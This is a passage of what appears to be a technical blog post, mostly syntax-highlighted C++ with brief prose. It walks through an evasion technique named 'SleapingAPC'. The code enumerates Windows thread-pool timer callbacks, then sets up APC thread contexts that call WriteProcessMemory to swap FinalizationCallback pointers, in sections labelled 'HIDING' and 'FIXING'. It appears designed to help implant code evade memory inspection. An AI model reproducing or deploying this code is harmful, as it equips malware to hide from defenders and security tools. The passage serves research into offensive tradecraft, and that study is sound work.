        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>full_tp_pool<span class="token punctuation">.</span>TimerQueue<span class="token punctuation">.</span>AbsoluteQueue<span class="token punctuation">.</span>WindowStart<span class="token punctuation">.</span>Root<span class="token punctuation">)</span>
            p_tp_timer <span class="token operator">=</span> <span class="token function">CONTAINING_RECORD</span><span class="token punctuation">(</span>full_tp_pool<span class="token punctuation">.</span>TimerQueue<span class="token punctuation">.</span>AbsoluteQueue<span class="token punctuation">.</span>WindowStart<span class="token punctuation">.</span>Root<span class="token punctuation">,</span> FULL_TP_TIMER<span class="token punctuation">,</span> WindowStartLinks<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

        bSuccess <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p_tp_timer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tp_timer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FULL_TP_TIMER<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>bSuccess <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

        PLIST_ENTRY pHead <span class="token operator">=</span> tp_timer<span class="token punctuation">.</span>WindowStartLinks<span class="token punctuation">.</span>Children<span class="token punctuation">.</span>Flink<span class="token punctuation">;</span>
        PLIST_ENTRY pFwd <span class="token operator">=</span> tp_timer<span class="token punctuation">.</span>WindowStartLinks<span class="token punctuation">.</span>Children<span class="token punctuation">.</span>Flink<span class="token punctuation">;</span>
        LIST_ENTRY entry <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

        <span class="token keyword">do</span> <span class="token punctuation">{</span>

            bSuccess <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tp_timer<span class="token punctuation">.</span>Work<span class="token punctuation">.</span>CleanupGroupMember<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> ctx<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TPP_CLEANUP_GROUP_MEMBER<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>bSuccess <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>ctx<span class="token punctuation">)</span><span class="token punctuation">.</span>FinalizationCallback <span class="token operator">==</span> ResumeThreadAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">//I save in my array the pointer to the structure in memory containing the callbacks</span>
                callbackArray<span class="token punctuation">[</span><span class="token operator">*</span>arraySize<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>PTPP_CLEANUP_GROUP_MEMBER<span class="token punctuation">)</span>tp_timer<span class="token punctuation">.</span>Work<span class="token punctuation">.</span>CleanupGroupMember<span class="token punctuation">.</span>Context<span class="token punctuation">;</span> <span class="token comment">//address of the object</span>
                <span class="token punctuation">(</span><span class="token operator">*</span>arraySize<span class="token punctuation">)</span><span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            p_tp_timer <span class="token operator">=</span> <span class="token function">CONTAINING_RECORD</span><span class="token punctuation">(</span>pFwd<span class="token punctuation">,</span> FULL_TP_TIMER<span class="token punctuation">,</span> WindowStartLinks<span class="token punctuation">)</span><span class="token punctuation">;</span>
            bSuccess <span class="token operator">=</span> <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p_tp_timer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tp_timer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FULL_TP_TIMER<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>bSuccess <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>

            <span class="token function">ReadProcessMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pFwd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>entry<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LIST_ENTRY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
            pFwd <span class="token operator">=</span> entry<span class="token punctuation">.</span>Flink<span class="token punctuation">;</span>

        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>pHead <span class="token operator">!=</span> pFwd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>Once the TpWorkerFactory objects of interests are enumerated, the SLEAPING APC routine is created and also the threads responsible for the execution of the APCs are added to the list of threads the main thread needs to be waiting for.</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp">
<span class="token comment">//TpWorkerFactory objects enumerated successfully so callbackArray now contains the addresses to fix</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">EnumResumeThreadCallbacks</span><span class="token punctuation">(</span>ResumeThreadAddress<span class="token punctuation">,</span> callbackArray<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token comment">//i should run SleapingAPC here so that all those contexts are available</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">SleapingAPC</span><span class="token punctuation">(</span>callbackArray<span class="token punctuation">,</span> <span class="token operator">&amp;</span>EvntHide<span class="token punctuation">,</span> <span class="token operator">&amp;</span>EvntFix<span class="token punctuation">,</span> ApcThreads<span class="token punctuation">,</span> Ctx<span class="token punctuation">,</span> CtxInit<span class="token punctuation">,</span> CtxFix<span class="token punctuation">,</span> CtxInitFix<span class="token punctuation">,</span> ResumeThreadValue<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

            <span class="token comment">//adding the newly created APC threads to the thread array to be waiting for</span>
            ThreadArray<span class="token punctuation">[</span>counter<span class="token punctuation">]</span> <span class="token operator">=</span> ApcThreads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//5</span>
            counter<span class="token operator">++</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WaitForMultipleObjects</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> ThreadArray<span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span> <span class="token operator">==</span> WAIT_FAILED<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
<span class="token comment">//SLEAPING APC FUNCTIONS INVOKED ABOVE </span>
<span class="token keyword">int</span> <span class="token function">SleapingAPC</span><span class="token punctuation">(</span>PTPP_CLEANUP_GROUP_MEMBER<span class="token operator">*</span> callbackinfo<span class="token punctuation">,</span> PHANDLE EvntHide<span class="token punctuation">,</span> PHANDLE EvntFix<span class="token punctuation">,</span> PHANDLE apcThreads<span class="token punctuation">,</span> PCONTEXT Ctx<span class="token punctuation">,</span> PCONTEXT CtxInit<span class="token punctuation">,</span> PCONTEXT CtxFix<span class="token punctuation">,</span> PCONTEXT CtxInitFix<span class="token punctuation">,</span> PDWORD64 ResumeThreadValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
   
   <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
   
    <span class="token keyword">if</span> <span class="token punctuation">(</span>NtCreateThreadEx <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> NtGetContextThread <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> NtWaitForSingleObject <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> NtQueueApcThread <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> NtAlertResumeThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*-----------HIDING-------------*/</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status <span class="token operator">=</span> <span class="token function">NtCreateThreadEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Thread<span class="token punctuation">,</span> THREAD_ALL_ACCESS<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//i copy the context of the thread created </span>
    <span class="token punctuation">(</span><span class="token operator">*</span>CtxInit<span class="token punctuation">)</span><span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_FULL<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status <span class="token operator">=</span> <span class="token function">NtGetContextThread</span><span class="token punctuation">(</span>Thread<span class="token punctuation">,</span> CtxInit<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">custom_memcpy_classic</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Ctx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> CtxInit<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*---------------------------------*/</span>
    <span class="token comment">/*-------------FIXING--------------*/</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status <span class="token operator">=</span> <span class="token function">NtCreateThreadEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ThreadFix<span class="token punctuation">,</span> THREAD_ALL_ACCESS<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token operator">*</span>CtxInitFix<span class="token punctuation">)</span><span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_FULL<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status <span class="token operator">=</span> <span class="token function">NtGetContextThread</span><span class="token punctuation">(</span>ThreadFix<span class="token punctuation">,</span> CtxInitFix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">custom_memcpy_classic</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>CtxFix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> CtxInitFix<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>CONTEXT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*---------------------------------*/</span>
    <span class="token comment">/*-----------HIDING THREADS-------------*/</span>
   
    <span class="token comment">//first thread just waiting for the event to be set</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Ctx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    <span class="token comment">/* wait til EvntSync gets triggered */</span>
    Ctx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtWaitForSingleObjectAddress<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>EvntHide<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Ctx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>SafeCallback<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Ctx<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>SafeCallback<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Ctx<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>SafeCallback<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Ctx<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>SafeCallback<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Ctx<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>WriteProcessMemory<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rdx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>callbackinfo<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">-&gt;</span>FinalizationCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R8 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>SafeCallback<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>R9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//setting the event to trigger ThreadFix</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Ctx<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Rsp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>NtTestAlertAddress<span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>SetEvent<span class="token punctuation">)</span><span class="token punctuation">;</span>
    Ctx<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rcx <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>EvntFix<span class="token punctuation">)</span><span class="token punctuation">;</span>

    Ctx<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span><span class="token punctuation">(</span>ExitThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
